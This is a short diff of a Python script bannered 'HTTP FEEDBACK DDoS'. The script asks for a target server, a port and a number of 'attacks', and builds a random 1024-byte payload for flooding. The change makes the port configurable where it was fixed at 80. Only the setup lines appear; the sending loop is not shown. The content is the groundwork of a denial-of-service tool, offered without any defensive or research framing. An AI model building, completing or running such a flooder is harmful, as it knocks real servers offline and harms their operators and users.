@@ -3,7 +3,7 @@ print("\n     -+--=:=- -==- -=:=--+-")
 print("       HTTP FEEDBACK DDoS")
 print("     -+--=:=- -==- -=:=--+-\n")
 host=raw_input(" -+- Server: ")
-port=80
+port=int(input(" -+- Port: "))
 message=random._urandom(1024)
 conn=input( " -+- Attacks:" )
 ip = socket.gethostbyname( host )
